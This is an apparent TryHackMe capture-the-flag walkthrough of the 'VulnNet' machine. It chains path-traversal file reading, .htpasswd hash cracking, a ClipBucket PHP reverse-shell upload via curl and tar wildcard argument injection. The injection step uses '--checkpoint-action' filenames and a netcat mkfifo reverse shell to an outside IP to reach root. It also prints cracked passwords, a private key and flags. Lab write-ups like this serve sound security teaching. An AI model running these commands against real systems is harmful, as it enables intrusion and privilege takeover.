# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 80 | HTTP |

```
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwkZ4lon+5ZNgVQmItwLRcbDT9QrJJGvPrfqsbAnwk4dgPz1GDjIg+RwRIZIwPGRPpyvd01W1vh0BNs7Uh9f5RVuojlLxjqsN1876Jvt5Ma7ajC49lzxmtI8B5Vmwxx9cRA8JBvENm0+BTsDjpaj3JWllRffhD25Az/F1Tz3fSua1GiR7R2eEKSMrD38+QGG22AlrCNHvunCJkPmYH9LObHq9uSZ5PbJmqR3Yl3SJarCZ6zsKBG5Ka/xJL17QUB5o6ZRHgpw/pmw+JKWUkodIwPe4hCVH0dQkfVAATjlx9JXH95h4EPmKPvZuqHZyGUPE5jPiaNg6YCNCtexw5Wo41
| 256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA8L+SEmXtvfURdTRsmhaay/VJTFJzXYlU/0uKlPAtdpyZ8qaI55EQYPwcPMIbvyYtZM37Bypg0Uf7Sa8i1aTKk=
| 256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKNuqHl39hJpIduBG9J7QwetpgO1PWQSUDL/rvjXPiWw
80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: VulnNet
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# RECONNAISSANCE
---

We need to add `vulnet.thm` to `/etc/hosts`:

```
echo 'IP vulnnet.thm' | sudo tee -a /etc/hosts
```


We can begin by fuzzing to check any hidden directories


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://vulnnet.thm/FUZZ" -ic -c -t 200

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://vulnnet.thm/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

img [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 3833ms]
css [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 161ms]
js [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 159ms]
fonts [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 162ms]
```


If we go inside the `js` directory, we can find this:

![Pasted image 20250401144159.png](../../IMAGES/Pasted%20image%2020250401144159.png)

If we check the first one, we can see this:

![Pasted image 20250401144226.png](../../IMAGES/Pasted%20image%2020250401144226.png)

The code is pretty messy, let's use a beautifier to look at it better:

![Pasted image 20250401144258.png](../../IMAGES/Pasted%20image%2020250401144258.png)

If we check at the code, we can find a hidden subdomain:

```
broadcast.vulnnet.thm
```


Let's check it out:

![Pasted image 20250401144421.png](../../IMAGES/Pasted%20image%2020250401144421.png)

We got a login prompt, since we don't have credentials, we need to leave it like that for now, if we remember correctly, we got another `js` file, let's read it too:

![Pasted image 20250401145736.png](../../IMAGES/Pasted%20image%2020250401145736.png)

If we check this, we got a hidden parameter at `index.php`, it is `referer=`, we can test this parameter to check its behavior, for example, if this is not correctly configured, we could exploit this to achieve `LFI` in order to read configuration files, let's submit the request to our proxy:

![Pasted image 20250401145938.png](../../IMAGES/Pasted%20image%2020250401145938.png)

There we go, we can read files, Let's begin exploitation.




# EXPLOITATION
---

Since we got LFI, we can try reading some standard files like `/var/www/html/config.php`, if we do this, we get the following:

![Pasted image 20250401160803.png](../../IMAGES/Pasted%20image%2020250401160803.png)

Even while trying a php filter, output does not appear, which means this file may not exist or may not be readable, let's try some other stuff, for example, since we are dealing with apache2, we can try reading the configuration file for it:

```
../../../../../../etc/apache2/apache2.conf
```

![Pasted image 20250401161052.png](../../IMAGES/Pasted%20image%2020250401161052.png)

Output does not appear, maybe we need to apply some other technique, what about double slashes: `//`:

```
..//..//..//..//..//..//etc/apache2/apache2.conf
```


![Pasted image 20250401161201.png](../../IMAGES/Pasted%20image%2020250401161201.png)

There we go, with this we now that we are able to read configuration files from apache2, now, let's go back to our context, for example, we are dealing with another subdomain called `broadcast.vulnnet.thm`, we are able to read web configurations in the `/etc/apache2/sites-enabled/000-default.conf` file, let's check it out:

```
..//..//..//..//..//..///etc/apache2/sites-enabled/000-default.conf
```

![Pasted image 20250401161443.png](../../IMAGES/Pasted%20image%2020250401161443.png)


We can see that we are able to read the `.htpasswd` file, The `.htpasswd` file is commonly used in web servers to store usernames and password pairs for basic authentication. It is typically used in conjunction with the Apache HTTP Server, but can be used with other web servers as well. The file contains encrypted passwords, which are used to verify the identity of users attempting to access restricted areas of a website, knowing this, we now that reading this file can get us access to the other subdomain:


```
..//..//..//..//..//..///etc/apache2/.htpasswd
```

![Pasted image 20250401161643.png](../../IMAGES/Pasted%20image%2020250401161643.png)


We get the following credentials:

```
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

Since this is in a hashed format, we need to crack it, for this, we can use john, let's store the hash in a file first:

```
echo 'developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0' > hash.txt
```


We can then proceed to crack it:


```
john --format=md5crypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9972761drmfsls (developers)
1g 0:00:00:10 DONE (2025-04-01 21:20) 0.09267g/s 200292p/s 200292c/s 200292C/s 9982..99686420
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

There we go, we got our credentials:

```
developers:9972761drmfsls
```

With the credentials, we are now able to log into the `broadcast.vulnnet.thm` subdomain:

![Pasted image 20250401162216.png](../../IMAGES/Pasted%20image%2020250401162216.png)


We are inside something called `ClipBucket`, let's search the version in the source code:

![Pasted image 20250401162351.png](../../IMAGES/Pasted%20image%2020250401162351.png)

So, `ClipBucket 4.0`, let's search for an exploit:


![Pasted image 20250401162441.png](../../IMAGES/Pasted%20image%2020250401162441.png)


There we go, we can upload files, if we check `exploit-db`, we can check the following PoC:


![Pasted image 20250401162859.png](../../IMAGES/Pasted%20image%2020250401162859.png)



Since we can upload files, let's upload a reverse shell, we can use the one at `PentestMonkey` github

Link: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php


Save the file and do the following:

```
curl -F "file=@thm_shell.php" -F "plupload=1" -F "name=thm_shell.php" http://broadcast.vulnnet.thm/actions/photo_uploader.php -H "Authorization: Basic ZGV2ZWxvcGVyczo5OTcyNzYxZHJtZnNscw=="
```

We get this response:

```
{"success":"yes","file_name":"17436166695449b9","extension":"php","file_directory":"2025\/04\/02"}
```


![Pasted image 20250402125929.png](../../IMAGES/Pasted%20image%2020250402125929.png)

We can now visit the following URL:

```
http://broadcast.vulnnet.thm/files/photos/
```

We notice this:

![Pasted image 20250402130005.png](../../IMAGES/Pasted%20image%2020250402130005.png)

There's a directory, if we follow it, we get to this:

![Pasted image 20250402130032.png](../../IMAGES/Pasted%20image%2020250402130032.png)


This is our reverse shell, let's set up our listener and get the connection:

![Pasted image 20250402130104.png](../../IMAGES/Pasted%20image%2020250402130104.png)

Let's proceed to privilege escalation.


# PRIVILEGE ESCALATION
---


Since we got our shell, let's stabilize it:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250402130331.png](../../IMAGES/Pasted%20image%2020250402130331.png)

If we look around, we can find this inside of `/var/backups`:

![Pasted image 20250402132010.png](../../IMAGES/Pasted%20image%2020250402132010.png)

We got a `ssh-backup.tar.gz`, if we look at the `home` directory, we find there's an user called `server-managment`, if we are able to unzip this file, we may be able to get either the credentials or the `id_rsa` of this user, let's get it in our local machine:

![Pasted image 20250402132117.png](../../IMAGES/Pasted%20image%2020250402132117.png)

There we go, we got the `id_rsa`:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6CE1A97A7DAB4829FE59CC561FB2CCC4

mRFDRL15t7qvaZxJGHDJsewnhp7wESbEGxeAWtCrbeIVJbQIQd8Z8SKzpvTMFLtt
dseqsGtt8HSruVIq++PFpXRrBDG5F4rW5B6VDOVMk1O9J4eHEV0N7es+hZ22o2e9
60qqj7YkSY9jVj5Nqq49uUNUg0G0qnWh8M6r8r83Ov+HuChdeNC5CC2OutNivl7j
dmIaFRFVwmWNJUyVen1FYMaxE+NojcwsHMH8aV2FTiuMUsugOwZcMKhiRPTElojn
tDrlgNMnP6lMkQ6yyJEDNFtn7tTxl7tqdCIgB3aYQZXAfpQbbfJDns9EcZEkEkrp
hs5Li20NbZxrtI6VPq6/zDU1CBdy0pT58eVyNtDfrUPdviyDUhatPACR20BTjqWg
3BYeAznDF0MigX/AqLf8vA2HbnRTYWQSxEnAHmnVIKaNVBdL6jpgmw4RjGzsUctk
jB6kjpnPSesu4lSe6n/f5J0ZbOdEXvDBOpu3scJvMTSd76S4n4VmNgGdbpNlayj5
5uJfikGR5+C0kc6PytjhZrnODRGfbmlqh9oggWpflFUm8HgGOwn6nfiHBNND0pa0
r8EE1mKUEPj3yfjLhW6PcM2OGEHHDQrdLDy3lYRX4NsCRSo24jtgN1+aQceNFXQ7
v8Rrfu5Smbuq3tBjVgIWxolMy+a145SM1Inewx4V4CX1jkk6sp0q9h3D03BYxZjz
n/gMR/cNgYjobbYIEYS9KjZSHTucPANQxhUy5zQKkb61ymsIR8O+7pHTeReelPDq
nv7FA/65Sy3xSUXPn9nhqWq0+EnhLpojcSt6czyX7Za2ZNP/LaFXpHjwYxBgmMkf
oVmLmYrw6pOrLHb7C5G6eR6D/WwRjhPpuhCWWnz+NBDQXIwUzzQvAyHyb7D1+Itn
MesF+L9zuUADGeuFl12dLahapM5ZuKURwnzW9+RwmmJSuT0AnN5OyuJtwfRznjyZ
7f5NP9u6vF0NQHYZI7MWcH7PAQsGTw3xzBmJdIfF71DmG0rqqCR7sB2buhoI4ve3
obvpmg2CvE+rnGS3wxuaEO0mWxVrSYiWdi7LJZvppwRF23AnNYNTeCw4cbvvCBUd
hKvhau01yVW2N/R8B43k5G9qbeNUmIZIltJZaxHnQpJGIbwFSItih49Fyr29nURK
ZJbyJbb4+Hy2ZNN4m/cfPNmCFG+w0A78iVPrkzxdWuTaBOKBstzpvLBA20d4o3ow
wC6j98TlmFUOKn5kJmX1EQAHJmNwERNKFmNwgHqgwYNzIhGRNdyoqJxBrshVjRk9
GSEZHtyGNoBqesyZg8YtsYIFGppZFQmVumGCRlfOGB9wPcAmveC0GNfTygPQlEMS
hoz4mTIvqcCwWibXME2g8M9NfVKs7M0gG5Xb93MLa+QT7TyjEn6bDa01O2+iOXkx
0scKMs4v3YBiYYhTHOkmI5OX0GVrvxKVyCJWY1ldVfu+6LEgsQmUvG9rYwO4+FaW
4cI3x31+qDr1tCJMLuPpfsyrayBB7duj/Y4AcWTWpY+feaHiDU/bQk66SBqW8WOb
d9vxlTg3xoDcLjahDAwtBI4ITvHNPp+hDEqeRWCZlKm4lWyI840IFMTlVqwmxVDq
-----END RSA PRIVATE KEY-----
```

We need a passphrase in order to use this key, we can crack it using john, let's do the following:

```
ssh2john id_rsa > id_rsa.hash

john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

oneTWO3gOyac (id_rsa)
```

There we go, we got our passphrase, let's go into ssh now:

![Pasted image 20250402132444.png](../../IMAGES/Pasted%20image%2020250402132444.png)

We are now able to read `user.txt`:

```
server-management@vulnnet:~$ cat user.txt
THM{907e420d979d8e2992f3d7e16bee1e8b}
```

We can use `linpeas` to check for a way to get into root:

![Pasted image 20250402132806.png](../../IMAGES/Pasted%20image%2020250402132806.png)

```
server-management@vulnnet:~$ cat /var/opt/backupsrv.sh
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup.
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

This command backs up **all files** in the directory. Since we control files in`/home/server-management/Documents`, we can inject malicious filenames that`tar` interprets as command-line arguments (e.g.,`--checkpoint-action` to execute arbitrary code). Let's reproduce the following in order to get a root shell:

```
# Let's begin by generating a netcat reverse shell using msfvenom
msfvenom -p cmd/unix/reverse_netcat lhost=10.6.34.159 lport=9001 R
echo '#!/bin/bash' > shell.sh
echo "mkfifo /tmp/bqauesy; nc 10.6.34.159 9001 0</tmp/bqauesy | /bin/sh >/tmp/bqauesy 2>&1; rm /tmp/bqauesy" >> shell.sh # Replace contents with the generated by 
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
chmod +x shell.sh
nc -lvnp PORT
```

Now, if we wait up 2 minutes and check our listener, this happens:

![Pasted image 20250402134609.png](../../IMAGES/Pasted%20image%2020250402134609.png)

There we go, we got root and can finally read `root.txt`:

```
root@vulnnet:/home/server-management/Documents# cat /root/root.txt
THM{220b671dd8adc301b34c2738ee8295ba}
```


![Pasted image 20250402134654.png](../../IMAGES/Pasted%20image%2020250402134654.png)

